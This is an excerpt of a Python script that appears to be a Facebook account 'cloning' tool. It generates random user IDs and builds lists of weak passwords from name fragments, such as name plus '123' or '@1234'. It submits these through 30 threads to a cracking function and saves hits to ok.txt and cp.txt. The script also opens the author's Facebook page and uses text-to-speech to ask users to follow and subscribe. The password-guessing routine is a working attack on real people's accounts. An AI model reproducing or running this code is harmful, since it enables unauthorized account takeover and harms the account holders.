...
time.sleep(2) 
os.system('espeak -a 300 " Please,,, Follow My Facebook id,,,,,,,,, And,,,, ,,,Subscribe My ,,,,,,YouTube ,,,Channel"')
#----------Contact----------#
...
class Main:
    def __init__(self):
        ...
        print(" [02] RANDOM GMAIL CLONE")
        print(" [00] Exit")
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        Emon =input(" [?] Choose : ")
        os.system('xdg-open https://facebook.com/Anonymousboybd71/')
        if Emon in ["1", "01"]:
            num()
        if Emon in ["2","02"]:
            gml()
...
def num():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        print(' \033[1;97m[+] PROCESS HAS BEEN STARED')
...
def gml():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        for guru in user:
            ...
            pwx = [kode,kodex,kode+kodex,kode+'@123',kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345',kode+'@',kode+'@@',kode+'@1234',kode+'@12345',kode+'@@@']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] CRACK PROCESS HAS BEEN COMPLETED')
    print(' [+] Ids saved in ok.txt,cp.txt')
